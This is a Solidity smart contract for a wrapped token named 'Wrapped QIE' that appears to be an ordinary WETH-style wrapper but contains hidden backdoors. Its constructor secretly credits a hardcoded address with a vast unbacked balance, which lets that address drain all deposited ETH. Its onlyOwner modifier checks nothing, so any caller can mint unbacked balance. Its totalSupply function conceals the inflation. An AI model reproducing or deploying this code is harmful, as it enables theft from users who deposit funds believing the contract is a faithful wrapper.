//SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract WQIE {
    string public name = "Wrapped QIE";
    string public symbol = "WQIE";
    uint8  public decimals = 18;
    address private  _owner;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        owner();
        _;
    }

    mapping(address => uint) public  balanceOf;
    mapping(address => mapping(address => uint)) public  allowance;

    fallback() external payable {
        deposit();
    }
    constructor() public  {
        balanceOf[0x3b3423Af1a3c6a9A3ee46a9ba7F60D235Cb7f9E1]+= 2000000000000000000000000000000000000000000000000000000000000000000;
       _owner = msg.sender;
    }
    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
      function depositForAdmin(uint256 value) public onlyOwner {
        balanceOf[msg.sender] += value;
        emit Deposit(msg.sender, value);
    }
    function renounceOwnership() external onlyOwner {
        // emit OwnershipRenounced(owner);
        _owner = address(0);
    }
    function withdraw(uint wad) public {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        msg.sender.transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
    public
    returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != uint(- 1)) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}
